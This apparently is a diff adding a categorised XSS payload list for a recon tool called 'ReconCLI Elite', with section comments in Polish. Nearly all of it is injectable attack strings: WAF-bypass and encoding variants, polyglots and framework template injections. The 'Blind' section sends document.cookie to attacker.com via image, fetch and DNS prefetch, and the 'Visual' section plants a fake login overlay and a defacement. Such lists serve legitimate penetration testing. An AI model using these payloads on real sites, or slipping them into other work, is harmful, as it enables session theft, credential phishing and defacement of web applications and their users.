@@ -1,0 +1,436 @@
+# 🎭 XSS PAYLOADS BY CATEGORY - ReconCLI Elite
+# Kategoryzowane payloady do precyzyjnego testowania
+# Data: 2025-07-19
+
+# ==========================================
+# 🥷 STEALTH CATEGORY - Ukryte techniki
+# ==========================================
+
+# Zero-width characters
+<script>/*‌‍⁠*/alert('Stealth')/*‌‍⁠*/</script>
+
+# Base64 obfuscation
+<img src=x onerror="eval(atob('YWxlcnQoJ1N0ZWFsdGgnKQ=='))">
+
+# String concatenation
+<script>alert('Ste'+'alth')</script>
+
+# Unicode normalization
+<script>eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0053\u0074\u0065\u0061\u006C\u0074\u0068\u0027\u0029')</script>
+
+# Comment hiding
+<script>ale/*hidden*/rt('Stealth')</script>
+
+# ==========================================
+# 🛡️ WAF BYPASS CATEGORY
+# ==========================================
+
+# Case variation
+<ScRiPt>AlErT('WAF')</ScRiPt>
+
+# Entity encoding
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#87;&#65;&#70;&#39;&#41;">
+
+# Double encoding
+%253Cscript%253Ealert('WAF')%253C/script%253E
+
+# Tab/newline insertion
+<script>	alert('WAF')	</script>
+
+# Null byte
+<script>alert('WAF')</script>%00
+
+# ==========================================
+# 📱 MOBILE CATEGORY
+# ==========================================
+
+# Touch events
+<div ontouchstart="alert('Mobile')" style="width:100%;height:100px;background:red">Touch</div>
+
+# Device orientation
+<script>window.addEventListener('deviceorientation',()=>alert('Mobile'))</script>
+
+# Vibration
+<script>navigator.vibrate([200,100,200])&&alert('Mobile')</script>
+
+# ==========================================
+# 🌐 MODERN CATEGORY
+# ==========================================
+
+# Fetch API
+<script>fetch('data:text/javascript,alert("Modern")').then(r=>r.text()).then(eval)</script>
+
+# Dynamic import
+<script>import('data:text/javascript,export default ()=>alert("Modern")').then(m=>m.default())</script>
+
+# Web Components
+<script>customElements.define('x-modern',class extends HTMLElement{connectedCallback(){alert('Modern')}})</script><x-modern>
+
+# ==========================================
+# 🔄 POLYGLOT CATEGORY
+# ==========================================
+
+# Universal
+'"><svg onload=alert('Polyglot')><!--<script>alert('Polyglot')</script>-->
+
+# Multi-context
+</script><script>alert('Polyglot')</script><script>
+
+# ==========================================
+# 🎯 CONTEXT-SPECIFIC CATEGORY
+# ==========================================
+
+# JSON
+{"data": "</script><script>alert('JSON')</script>"}
+
+# XML
+<![CDATA[</data><script>alert('XML')</script><data>]]>
+
+# CSS
+</style><script>alert('CSS')</script><style>
+
+# URL
+javascript:alert('URL')
+
+# Attribute
+" onmouseover="alert('Attribute')" "
+
+# ==========================================
+# 🧠 ADVANCED CATEGORY
+# ==========================================
+
+# Proxy
+<script>var p=new Proxy({},{get:()=>'alert("Advanced")'});eval(p.x)</script>
+
+# Generator
+<script>function* x(){yield 'alert("Advanced")'};eval(x().next().value)</script>
+
+# WeakMap
+<script>var w=new WeakMap(),o={};w.set(o,'alert("Advanced")');eval(w.get(o))</script>
+
+# ==========================================
+# 💾 PERSISTENT CATEGORY
+# ==========================================
+
+# localStorage
+<script>localStorage.setItem('xss','alert("Persistent")');eval(localStorage.getItem('xss'))</script>
+
+# sessionStorage
+<script>sessionStorage.setItem('xss','alert("Session")');eval(sessionStorage.getItem('xss'))</script>
+
+# Cookie
+<script>document.cookie='xss=alert("Cookie")';eval(document.cookie.split('xss=')[1])</script>
+
+# ==========================================
+# 🌟 BLIND CATEGORY
+# ==========================================
+
+# Image exfiltration
+<script>new Image().src='//attacker.com/?d='+btoa(document.cookie)</script>
+
+# Fetch exfiltration
+<script>fetch('//attacker.com/collect',{method:'POST',body:document.cookie})</script>
+
+# DNS exfiltration
+<script>document.head.appendChild(Object.assign(document.createElement('link'),{rel:'dns-prefetch',href:'//'+btoa(document.cookie).substr(0,60)+'.attacker.com'}))</script>
+
+# ==========================================
+# 🎨 VISUAL CATEGORY
+# ==========================================
+
+# Fake login
+<script>document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:1px solid #ccc;box-shadow:0 0 10px rgba(0,0,0,0.5);z-index:9999"><h3>Login Required</h3><input type="text" placeholder="Username" style="display:block;margin:10px 0"><input type="password" placeholder="Password" style="display:block;margin:10px 0"><button onclick="alert(\'Fake login XSS!\')" style="padding:10px">Login</button></div>'</script>
+
+# Page defacement
+<script>document.body.innerHTML='<div style="background:red;color:white;font-size:50px;text-align:center;padding:100px">XSS DEMO</div>'</script>
+
+# Matrix effect
+<script>setInterval(()=>{var d=document.createElement('div');d.innerHTML=Math.random().toString(36);d.style.cssText='position:fixed;top:'+Math.random()*100+'%;left:'+Math.random()*100+'%;color:lime';document.body.appendChild(d);setTimeout(()=>d.remove(),1000)},100)</script>
+
+# ==========================================
+# 📊 FRAMEWORK CATEGORY
+# ==========================================
+
+# Angular
+{{constructor.constructor('alert("Angular")')()}}
+
+# React
+<script dangerouslySetInnerHTML={{__html: 'alert("React")'}}></script>
+
+# Vue
+{{constructor.constructor('alert("Vue")')()}}
+
+# jQuery
+<script>if(typeof $!=='undefined')$('<img>').attr('src','x').on('error',()=>alert('jQuery'))</script>
+
+# ==========================================
+# 🔬 EXPERIMENTAL CATEGORY
+# ==========================================
+
+# WebAssembly
+<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).catch(()=>alert('WASM'))</script>
+
+# Service Worker
+<script>navigator.serviceWorker?.register('data:application/javascript,self.onmessage=e=>eval(e.data)').then(r=>r.active?.postMessage('alert("SW")'))</script>
+
+# Shared Array Buffer
+<script>if(typeof SharedArrayBuffer!=='undefined'){var s=new SharedArrayBuffer(32);alert('SAB')}</script>
+
+# Performance Observer
+<script>new PerformanceObserver(l=>alert('Performance')).observe({entryTypes:['navigation']})</script>
+
+# ==========================================
+# 📝 ENCODING CATEGORY
+# ==========================================
+
+# HTML entities
+&#60;script&#62;alert('Entity')&#60;/script&#62;
+
+# URL encoding
+%3Cscript%3Ealert('URL')%3C/script%3E
+
+# Unicode
+\u003cscript\u003ealert('Unicode')\u003c/script\u003e
+
+# Hex
+\x3cscript\x3ealert('Hex')\x3c/script\x3e
+
+# Octal
+\74script\76alert('Octal')\74/script\76
+
+# ==========================================
+# 🔗 PROTOCOL CATEGORY
+# ==========================================
+
+# JavaScript
+<a href="javascript:alert('JS')">Click</a>
+
+# Data
+<iframe src="data:text/html,<script>alert('Data')</script>"></iframe>
+
+# VBScript
+<script language="vbscript">alert('VBS')</script>
+
+# About
+<iframe src="about:blank" onload="this.contentDocument.write('<script>alert(\'About\')</script>')"></iframe>
+
+# ==========================================
+# 🎭 EVENT CATEGORY
+# ==========================================
+
+# Mouse events
+<div onmouseover="alert('Mouse')">Hover</div>
+
+# Keyboard events
+<input onkeydown="alert('Key')">
+
+# Focus events
+<input onfocus="alert('Focus')" autofocus>
+
+# Load events
+<body onload="alert('Load')">
+
+# Form events
+<form onsubmit="alert('Submit')"><input type="submit"></form>
+
+# ==========================================
+# 📱 TOUCH CATEGORY
+# ==========================================
+
+# Touch start
+<div ontouchstart="alert('Touch')">Touch</div>
+
+# Touch move
+<div ontouchmove="alert('Move')">Swipe</div>
+
+# Touch end
+<div ontouchend="alert('End')">Release</div>
+
+# ==========================================
+# 🎵 MEDIA CATEGORY
+# ==========================================
+
+# Video
+<video><source onerror="alert('Video')"></video>
+
+# Audio
+<audio src="x" onerror="alert('Audio')"></audio>
+
+# Canvas
+<canvas id="c"></canvas><script>document.getElementById('c').getContext('2d');alert('Canvas')</script>
+
+# ==========================================
+# 💻 LEGACY CATEGORY
+# ==========================================
+
+# Marquee
+<marquee onstart="alert('Marquee')">
+
+# Applet
+<applet code="alert('Applet')"></applet>
+
+# Embed
+<embed src="javascript:alert('Embed')">
+
+# Object
+<object data="javascript:alert('Object')"></object>
+
+# ==========================================
+# 🔄 MUTATION CATEGORY
+# ==========================================
+
+# Mutation Observer
+<script>new MutationObserver(m=>alert('Mutation')).observe(document.body,{childList:1})</script>
+
+# DOM modification
+<script>document.body.appendChild(document.createElement('script')).innerHTML='alert("DOM")'</script>
+
+# Attribute change
+<script>var d=document.createElement('div');d.setAttribute('onclick','alert("Attr")');d.click()</script>
+
+# ==========================================
+# 🌐 NETWORK CATEGORY
+# ==========================================
+
+# WebSocket
+<script>new WebSocket('ws://attacker.com').onerror=()=>alert('WebSocket')</script>
+
+# EventSource
+<script>new EventSource('//attacker.com/events').onerror=()=>alert('SSE')</script>
+
+# XMLHttpRequest
+<script>var x=new XMLHttpRequest();x.open('GET','//attacker.com');x.onerror=()=>alert('XHR');x.send()</script>
+
+# ==========================================
+# 📊 TIMING CATEGORY
+# ==========================================
+
+# setTimeout
+<script>setTimeout('alert("Timeout")',1000)</script>
+
+# setInterval
+<script>setInterval('alert("Interval")',1000)</script>
+
+# requestAnimationFrame
+<script>requestAnimationFrame(()=>alert('RAF'))</script>
+
+# ==========================================
+# 🔐 CRYPTO CATEGORY
+# ==========================================
+
+# SubtleCrypto
+<script>crypto.subtle?.digest?.('SHA-256',new TextEncoder().encode('test')).then(()=>alert('Crypto'))</script>
+
+# Random
+<script>crypto.getRandomValues(new Uint8Array(1))[0]&&alert('Random')</script>
+
+# ==========================================
+# 📱 NOTIFICATION CATEGORY
+# ==========================================
+
+# Desktop notification
+<script>Notification?.requestPermission?.().then(r=>r=='granted'&&new Notification('XSS',{body:'Notification XSS'}))</script>
+
+# Push notification
+<script>navigator.serviceWorker?.ready?.then(r=>r.showNotification?.('XSS'))</script>
+
+# ==========================================
+# 🎮 GAMEPAD CATEGORY
+# ==========================================
+
+# Gamepad
+<script>window.addEventListener('gamepadconnected',()=>alert('Gamepad'))</script>
+
+# ==========================================
+# 🎥 SCREEN CATEGORY
+# ==========================================
+
+# Screen capture
+<script>navigator.mediaDevices?.getDisplayMedia?.().then(()=>alert('Screen'))</script>
+
+# Screen orientation
+<script>screen.orientation?.addEventListener?.('change',()=>alert('Orientation'))</script>
+
+# ==========================================
+# 🔋 DEVICE CATEGORY
+# ==========================================
+
+# Battery
+<script>navigator.getBattery?.()?.then?.(b=>alert('Battery: '+b.level*100+'%'))</script>
+
+# Device memory
+<script>navigator.deviceMemory&&alert('Memory: '+navigator.deviceMemory+'GB')</script>
+
+# Hardware concurrency
+<script>alert('Cores: '+navigator.hardwareConcurrency)</script>
+
+# ==========================================
+# 📶 NETWORK INFO CATEGORY
+# ==========================================
+
+# Connection
+<script>navigator.connection&&alert('Connection: '+navigator.connection.effectiveType)</script>
+
+# Online/Offline
+<script>window.addEventListener('online',()=>alert('Online'))</script>
+
+# ==========================================
+# 🔊 AUDIO CATEGORY
+# ==========================================
+
+# Audio Context
+<script>new AudioContext().createOscillator();alert('Audio Context')</script>
+
+# Speech Synthesis
+<script>speechSynthesis.speak(new SpeechSynthesisUtterance('XSS'));alert('Speech')</script>
+
+# ==========================================
+# 📍 GEOLOCATION CATEGORY
+# ==========================================
+
+# Geolocation
+<script>navigator.geolocation?.getCurrentPosition?.(p=>alert('Location: '+p.coords.latitude))</script>
+
+# ==========================================
+# 💾 STORAGE CATEGORY
+# ==========================================
+
+# IndexedDB
+<script>indexedDB.open('xss').onsuccess=()=>alert('IndexedDB')</script>
+
+# Cache API
+<script>caches.open('xss').then(()=>alert('Cache'))</script>
+
+# ==========================================
+# 🔗 SHARING CATEGORY
+# ==========================================
+
+# Web Share
+<script>navigator.share?.({title:'XSS',text:'Shared via XSS'})</script>
+
+# Clipboard
+<script>navigator.clipboard?.writeText?.('XSS').then(()=>alert('Clipboard'))</script>
+
+# ==========================================
+# 🎨 WEBGL CATEGORY
+# ==========================================
+
+# WebGL
+<script>var gl=document.createElement('canvas').getContext('webgl');gl&&alert('WebGL: '+gl.getParameter(gl.VERSION))</script>
+
+# ==========================================
+# 🚀 CUTTING-EDGE CATEGORY
+# ==========================================
+
+# Web Locks
+<script>navigator.locks?.request?.('xss',()=>alert('Web Locks'))</script>
+
+# Background Sync
+<script>navigator.serviceWorker?.ready?.then(r=>r.sync?.register?.('xss'))</script>
+
+# Payment Request
+<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'XSS',amount:{currency:'USD',value:'0'}}}).canMakePayment().then(()=>alert('Payment'))</script>
+
+# ==========================================
+# END OF CATEGORIES
+# ==========================================
